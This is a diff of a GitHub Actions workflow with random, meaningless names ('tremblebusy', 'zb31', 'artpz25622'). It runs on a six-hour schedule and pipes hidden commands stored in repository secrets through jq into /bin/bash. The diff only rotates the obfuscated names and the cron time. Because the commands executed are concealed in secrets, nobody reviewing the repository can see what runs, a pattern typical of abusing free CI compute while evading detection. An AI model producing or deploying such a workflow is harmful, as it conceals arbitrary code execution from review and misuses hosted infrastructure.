@@ -3,8 +3,7 @@ name: tremblebusy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 2/6 * * *'
-
+    - cron: '52 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: tremblebusy
         env:
-          ljp993: ${{ secrets.ljp993 }}
+          zb31: ${{ secrets.zb31 }}
         run: |
-          echo $ljp993 | jq -r .fsd70 | /bin/bash
-          echo $ltxys33 | jq -r .shv2 | /bin/bash
-          echo $kzc66631 | jq -r .qua258 | /bin/bash
-          echo $ileo8 | jq -r .ofc96 | /bin/bash
-          echo $zyq32 | jq -r .y3 | /bin/bash
-          echo $sn7057 | jq -r .gmv16709 | /bin/bash
-          echo $zmviq47610 | jq -r .ceg3078 | /bin/bash
+          echo $zb31 | jq -r .artpz25622 | /bin/bash
+          echo $zz7 | jq -r .iwduf19325 | /bin/bash
+          echo $ch74 | jq -r .ay574 | /bin/bash
+          echo $sk9 | jq -r .nhnvu5548 | /bin/bash
+          echo $k527 | jq -r .vrxt3 | /bin/bash
+          echo $ak4653 | jq -r .neaoi30 | /bin/bash
+          echo $l8751 | jq -r .phe2810 | /bin/bash
 
